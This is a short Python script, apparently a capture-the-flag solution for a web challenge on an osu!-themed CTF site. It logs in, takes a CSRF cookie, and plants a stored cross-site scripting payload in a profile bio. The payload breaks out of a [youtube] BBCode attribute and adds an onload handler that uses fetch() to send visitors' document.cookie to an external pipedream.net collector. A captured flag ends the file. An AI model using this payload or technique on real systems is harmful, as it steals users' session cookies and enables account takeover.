import requests

# Base URL of the API
BASE_URL = "https://profile-page.web.osugaming.lol"

# User credentials
USERNAME = "allen11111"
PASSWORD = "allen11111"

# Endpoint URLs
LOGIN_URL = f"{BASE_URL}/api/login"
UPDATE_URL = f"{BASE_URL}/api/update"

# Start a session to persist cookies
session = requests.Session()

# Log in to the API to obtain the CSRF token
login_response = session.post(LOGIN_URL, data={'username': USERNAME, 'password': PASSWORD})

if login_response.status_code != 200:
    print("Failed to log in")
    exit()

# Extract CSRF token from cookies
csrf_token = session.cookies.get('csrf')

if not csrf_token:
    print("CSRF token not found")
    exit()

# Prepare the header with the CSRF token
headers = {
    'csrf': csrf_token
}

# New bio to update
new_bio = '[youtube]dummy" onload="fetch(\'https://eomlp3rvjuni0t9.m.pipedream.net/\'+document.cookie)//[/youtube]'
# Update the bio
update_response = session.post(UPDATE_URL, headers=headers, data={'bio': new_bio})

if update_response.status_code == 200:
    print("Bio updated successfully!")
else:
    print("Failed to update bio")

# Close the session
session.close()

#osu{but_all_i_w4nted_to_do_was_w4tch_y0utube...}